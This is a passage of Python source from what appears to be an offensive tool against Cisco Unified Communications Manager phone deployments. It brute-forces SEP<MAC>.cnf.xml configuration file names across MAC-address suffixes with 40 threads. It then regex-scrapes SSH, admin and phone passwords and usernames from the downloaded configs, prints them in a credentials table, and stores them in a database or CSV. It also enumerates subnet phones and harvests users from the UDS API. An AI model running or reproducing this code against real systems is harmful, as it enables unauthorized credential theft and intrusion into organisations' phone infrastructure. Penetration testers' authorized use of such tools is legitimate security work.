                                failed_detections += 1
                                continue
                        
                        print(f'  ✓ CUCM Server: {phone_cucm}')
                        print(f'  → Using partial MAC: {partial_mac} for brute force\n')
                        
                        all_found_macs.add(partial_mac)
                        mac_to_cucm[partial_mac] = phone_cucm
                        successful_detections += 1
                        
                        # Log MAC prefix to database unless --no-db is set
                        if not no_db:
                            log_mac_prefix_to_db(phone_cucm, phone, full_mac, partial_mac, db_file)
                    else:
                        print(f'  ✗ Could not extract MAC from hostname: {hostname}')
                        print(f'  → Skipping this phone, continuing with others...\n')
                        failed_detections += 1
                else:
                    print(f'  ✗ Could not detect hostname from phone {phone}')
                    print(f'  → Phone may be unreachable or not a Cisco device')
                    print(f'  → Skipping this phone, continuing with others...\n')
                    failed_detections += 1
            except KeyboardInterrupt:
                print(f'\n[!] Interrupted by user. Stopping phone detection.')
                break
            except Exception as e:
                print(f'  ✗ Error detecting MAC from {phone}: {str(e)}')
                print(f'  → Skipping this phone, continuing with others...\n')
                failed_detections += 1
        
        print(f'Phone detection complete: {successful_detections} succeeded, {failed_detections} failed\n')
        
        if not all_found_macs:
            print('No MAC addresses detected. Cannot proceed with brute force.')
            quit(1)
        
        # Build combined list of all MAC candidates from all phones
        print(f'Building randomized candidate list for {len(all_found_macs)} MAC prefix(es)...')
        all_candidates = []
        max_variations = 16 ** brute_mac_len
        for partial_mac in all_found_macs:
            phone_cucm = mac_to_cucm[partial_mac]
            for i in range(max_variations):
                suffix = f'{i:0{brute_mac_len}X}'
                full_mac = partial_mac + suffix
                filename = f'SEP{full_mac}.cnf.xml'
                all_candidates.append((phone_cucm, full_mac, filename))
        
        # Randomize the order to distribute load across different MAC prefixes
        random.shuffle(all_candidates)
        print(f'Randomized {len(all_candidates)} total candidates across all phones\n')
        
        # ============================================================================
        # Multi-threaded brute force download (ONLY used for brute force mode)
        # Regular downloads use single-threaded search_for_secrets() function
        # ============================================================================
        
        # Process all candidates with multi-threading
        # Use the args values that were set earlier (no need for globals().get since they're in scope)
        # db_file, no_db, and force_download are already defined above
        
        print(f'Starting multi-threaded brute force with 40 workers...')
        
        work_queue = queue.Queue()
        results_queue = queue.Queue()
        backoff_manager = TFTPBackoffManager()
        num_threads = 40
        
        # Create and start worker threads
        threads = []
        for i in range(num_threads):
            t = threading.Thread(
                target=download_worker,
                args=(work_queue, results_queue, None, use_tftp, backoff_manager, no_db, db_file, force_download),
                daemon=True,
                name=f'Worker-{i}'
            )
            t.start()
            threads.append(t)
        
        try:
            print(f'[*] Started {num_threads} worker threads')
            print(f'[*] Queuing {len(all_candidates)} download tasks...')
            sys.stdout.flush()
        except (ValueError, AttributeError):
            pass
        
        # Queue all candidates
        for idx, (cucm, full_mac, filename) in enumerate(all_candidates):
            work_queue.put((idx, full_mac, filename, cucm))
            if (idx + 1) % 10000 == 0:
                try:
                    print(f'  Queued {idx + 1}/{len(all_candidates)} tasks...', flush=True)
                except (ValueError, AttributeError):
                    pass  # stdout closed or unavailable
        
        try:
            print(f'[*] All {len(all_candidates)} tasks queued', flush=True)
            print(f'[*] Processing downloads with {num_threads} workers (this may take several minutes)...\n', flush=True)
        except (ValueError, AttributeError):
            pass
        
        # Process results with progress bar
        all_configs = []
        found_macs = []
        skipped = 0
        successful = 0
        processed = 0
        
        # Use alive_bar only if output is to a terminal
        use_progress_bar = sys.stdout.isatty()
        
        if use_progress_bar:
            with alive_bar(len(all_candidates), title=f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: 0") as prog_bar:
                for _ in range(len(all_candidates)):
                    try:
                        index, full_mac, content, method, was_cached = results_queue.get(timeout=120)
                        
                        if was_cached:
                            skipped += 1
                        
                        if content:
                            all_configs.append((full_mac, content))
                            found_macs.append(full_mac)
                            successful += 1
                            # Update progress bar title with current count
                            prog_bar.title(f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: {successful}")
                        
                        prog_bar()
                            
                    except queue.Empty:
                        print('[!] Timeout waiting for results')
                        break
        else:
            # Simple text-based progress for non-TTY output
            try:
                print(f'[*] Starting to process results...')
                sys.stdout.flush()
                
                last_status_time = time.time()
                for _ in range(len(all_candidates)):
                    try:
                        index, full_mac, content, method, was_cached = results_queue.get(timeout=120)
                        processed += 1
                        
                        if was_cached:
                            skipped += 1
                        
                        if content:
                            all_configs.append((full_mac, content))
                            found_macs.append(full_mac)
                            successful += 1
                            print(f'[+] Found config #{successful}: SEP{full_mac}')
                            sys.stdout.flush()
                        
                        # Print progress every 1000 items or every 5 seconds
                        current_time = time.time()
                        if processed % 1000 == 0 or (current_time - last_status_time) >= 5:
                            remaining = len(all_candidates) - processed
                            print(f'[*] Progress: {processed}/{len(all_candidates)} processed ({successful} found, {remaining} remaining)')
                            sys.stdout.flush()
                            last_status_time = current_time
                            
                    except queue.Empty:
                        remaining = len(all_candidates) - processed
                        print(f'[!] Timeout after processing {processed}/{len(all_candidates)} items ({remaining} remaining)')
                        break
                    except Exception as e:
                        print(f'[!] ERROR in results processing: {type(e).__name__}: {e}')
                        import traceback
                        traceback.print_exc()
                        sys.stdout.flush()
                        break
            except Exception as outer_e:
                print(f'[!] FATAL ERROR in else block: {type(outer_e).__name__}: {outer_e}')
                import traceback
                traceback.print_exc()
                sys.stdout.flush()
        
        # Wait for all queued work to be completed
        try:
            print(f'\n[*] Waiting for all workers to finish processing...')
            sys.stdout.flush()
        except (ValueError, AttributeError):
            pass
        
        work_queue.join()
        
        try:
            print(f'[*] All tasks completed!')
            sys.stdout.flush()
        except (ValueError, AttributeError):
            pass
        
        # Send poison pills to stop workers
        for _ in range(num_threads):
            work_queue.put(None)
        
        # Wait for all workers to exit gracefully
        for t in threads:
            t.join()
        
        # Print summary
        if found_macs:
            mac_list = ', '.join([f"SEP{mac}" for mac in found_macs[:10]])
            suffix = ", ..." if len(found_macs) > 10 else ""
            print(f'\n[+] Found {len(found_macs)} config(s): {mac_list}{suffix}')
        
        if skipped > 0:
            print(f'[*] Skipped {skipped} cached config(s) from previous successful downloads (use --force to re-download)')
        
        print(f'Brute force complete: {successful}/{len(all_candidates)} configs found')
        
        # Process all found configs
        if all_configs:
            print(f'\n\n{"="*60}')
            print(f'SUMMARY: {len(all_configs)} configuration files found!')
            print("="*60)
            
            # Get CUCM host for logging (use first one from mapping)
            summary_cucm = list(mac_to_cucm.values())[0] if mac_to_cucm else 'Multiple-CUCM-Servers'
            
            # Collect all findings
            all_found_credentials = []
            all_found_usernames = []
            devices_with_creds = {}
            devices_with_users = {}
            
            for mac, content in all_configs:
                # Search for secrets in this config
                config_creds = []
                config_users = []
                
                # Track username across the config file
                user = ''
                user2 = ''
                
                for line in content.split('\n'):
                    match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
                    if match:
                        if match.group(2):
                            user = match.group(2)
                            config_users.append((user, f'SEP{mac}'))
                        if match.group(3):
                            password = match.group(3)
                            config_creds.append((user, password, f'SEP{mac}'))
                        if match.group(4):
                            user2 = match.group(4)
                            config_users.append((user2, f'SEP{mac}'))
                        if match.group(5):
                            password = match.group(5)
                            config_creds.append((user if user else 'unknown', password, f'SEP{mac}'))
                
                # Track devices with findings
                if config_creds:
                    devices_with_creds[f'SEP{mac}'] = config_creds
                    all_found_credentials.extend(config_creds)
                
                if config_users:
                    devices_with_users[f'SEP{mac}'] = config_users
                    all_found_usernames.extend(config_users)
            
            # Display results
            if all_found_credentials or all_found_usernames:
                print(f'\n\n{"="*70}')
                print(f'{"CREDENTIALS DISCOVERY SUMMARY":^70}')
                print("="*70)
                
                if all_found_credentials:
                    print(f'\n\033[1m[+] CREDENTIALS FOUND ({len(all_found_credentials)} total)\033[0m')
                    print("-"*70)
                    print(f'{"Device":<20} {"Username":<20} {"Password":<20}')
                    print("-"*70)
                    for device, creds in devices_with_creds.items():
                        for cred in creds:
                            username = cred[0] if cred[0] else 'N/A'
                            password = cred[1]
                            print(f'{device:<20} {username:<20} \033[91m{password:<20}\033[0m')
                
                if all_found_usernames:
                    print(f'\n\033[1m[+] USERNAMES FOUND ({len(all_found_usernames)} total)\033[0m')
                    print("-"*70)
                    print(f'{"Device":<20} {"Username":<20}')
                    print("-"*70)
                    for device, users in devices_with_users.items():
                        for username in users:
                            print(f'{device:<20} {username[0]:<20}')
                
                print(f'\n{"="*70}')
                print(f'\n\033[1mSTATISTICS:\033[0m')
                print(f'  • Total configs downloaded:     {len(all_configs)}')
                print(f'  • Devices with credentials:     {len(devices_with_creds)}')
                print(f'  • Devices with usernames only:  {len(devices_with_users)}')
                print(f'  • Total credentials discovered: {len(all_found_credentials)}')
                print(f'  • Total usernames discovered:   {len(all_found_usernames)}')
                if len(mac_to_cucm) > 1:
                    unique_cucms = set(mac_to_cucm.values())
                    print(f'  • CUCM servers:                 {", ".join(sorted(unique_cucms))}')
                print("="*70)
                
                # Log to database (unless --no-db)
                if not no_db:
                    log_credentials_to_db(summary_cucm, all_found_credentials, all_found_usernames, db_file)
                
                # Export to CSV if requested
                if csv_output:
                    csv_filename = csv_output if csv_output != True else 'seeyoucm_results.csv'
                    export_to_csv(all_found_credentials, all_found_usernames, csv_filename)
            else:
                print(f'\n\n{"="*70}')
                print(f'  No credentials or usernames found in {len(all_configs)} configs')
                print("="*70)
        else:
            print('\nNo configuration files found')
        
        quit(0)

    if enumsubnet:
        hosts = enumerate_phones_subnet(enumsubnet)
        for host in hosts:
            found_credentials.clear()
            found_usernames.clear()
            if CUCM_host is None:
                CUCM_host = get_cucm_name_from_phone(host["ip"])
            if hostname_resolves(CUCM_host):
                file_names = get_config_names(CUCM_host, hostnames=[host["hostname"]])
                for file in file_names:
                    print('Connecting to {CUCM_host} and getting config for {host}/{hostname}'.format(CUCM_host=CUCM_host,host=host["ip"],hostname=host["hostname"]))
                    search_for_secrets(CUCM_host, file, use_tftp)
                if found_credentials != []:
                    print('Credentials Found in Configurations!')
                for cred in found_credentials:
                    print('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]))
                if found_usernames != []:
                    print('Usernames Found in Configurations!')
                for usernames in found_usernames:
                    print('{0}\t{1}'.format(usernames[0],usernames[1]))
            print("\n")
        quit(0)
    elif phones:
        # Process multiple phones
        for phone in phones:
            found_credentials.clear()
            found_usernames.clear()
            print(f'\nProcessing phone: {phone}')
            
            if args.host is None:
                CUCM_host = get_cucm_name_from_phone(phone)
            else:
                CUCM_host = args.host
            
            if CUCM_host is None:
                print('Unable to automatically detect the CUCM Server for {phone}. Skipping...')
                continue
            else:
                print('The detected IP address/hostname for the CUCM server is {}'.format(CUCM_host))
            
            # Get hostnames for this phone
            hostnames = [get_hostname_from_phone(phone)]
            hostnames += get_phones_hostnames_from_reverse(phone) or []
            
            # Get config files
            file_names = get_config_names(CUCM_host, hostnames=hostnames)
            if file_names is None:
                print('Unable to detect file names from CUCM for {}'.format(phone))
                continue
            
            # Search for secrets
            for file in file_names:
                creds, users = search_for_secrets(CUCM_host, file, use_tftp)
                if creds:
                    found_credentials.extend(creds)
                if users:
                    found_usernames.extend(users)
            
            # Display results for this phone
            if found_credentials != []:
                print('Credentials Found in Configurations!')
                for cred in found_credentials:
                    print('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]))
            
            if found_usernames != []:
                print('Usernames Found in Configurations!')
                for usernames in found_usernames:
                    print('{0}\t{1}'.format(usernames[0],usernames[1]))

            if not no_db and (found_credentials or found_usernames):
                log_credentials_to_db(CUCM_host, found_credentials, found_usernames, db_file)
        
        quit(0)
    elif args.host:
        CUCM_host = args.host
    else:
        print('You must enter either a phone IP address or the IP address of the CUCM server')
        quit(1)
    file_names = get_config_names(CUCM_host)
    if file_names is None:
        if phones:
            hostnames = [get_hostname_from_phone(phones[0])]
            hostnames += get_phones_hostnames_from_reverse(phones[0]) or []

        if hostnames == []:
            file_names = get_config_names(CUCM_host)
        else:
            file_names = get_config_names(CUCM_host, hostnames=hostnames)

    if file_names is None:
        print('Unable to detect file names from CUCM')
    else:
        # Results are collected in all_credentials and all_usernames below
        all_credentials = []
        all_usernames = []
        if file_names:
            for file in file_names:
                creds, users = search_for_secrets(CUCM_host, file, use_tftp)
                all_credentials.extend(creds)
                all_usernames.extend(users)

        if all_credentials:
            print('Credentials Found in Configurations!')
            for cred in all_credentials:
                print('{0}\t{1}\t{2}'.format(cred[0], cred[1], cred[2]))

        if all_usernames:
            print('Usernames Found in Configurations!')
            for usernames in all_usernames:
                print('{0}\t{1}'.format(usernames[0], usernames[1]))

        # Always write to database unless --no-db is set
        if not no_db and (all_credentials or all_usernames):
            if debug:
                print(f'[DEBUG] Writing to DB: CUCM_host={CUCM_host}, credentials={all_credentials}, usernames={all_usernames}, db_file={db_file}')
            result = log_credentials_to_db(CUCM_host, all_credentials, all_usernames, db_file)
            if debug:
                print(f'[DEBUG] log_credentials_to_db returned: {result}')
        quit(0)
    if args.userenum:
        print('Getting users from UDS API.')
        #each API call is limited by default to 64 users per request
        api_users = get_users_api(CUCM_host)
        if api_users != []:
            unique_users = set(api_users)
            api_users = list(unique_users)
            
            # Write to output file
            with open(outfile, mode='w') as outputfile:
                for line in api_users:
                    outputfile.write(line+'\n')
            
            # Log to database unless --no-db flag is set
            if not no_db:
                if log_uds_usernames_to_db(CUCM_host, api_users, db_file):
                    print(f'[+] Logged {len(api_users)} UDS API usernames to database')
                else:
                    print(f'[-] Failed to log UDS API usernames to database')
            
            print(f'The following {len(api_users)} users were identified from the UDS API')
            print(f'[*] Usernames written to: {outfile}')
            if debug:
                for username in api_users:
                    print('{0}'.format(username))
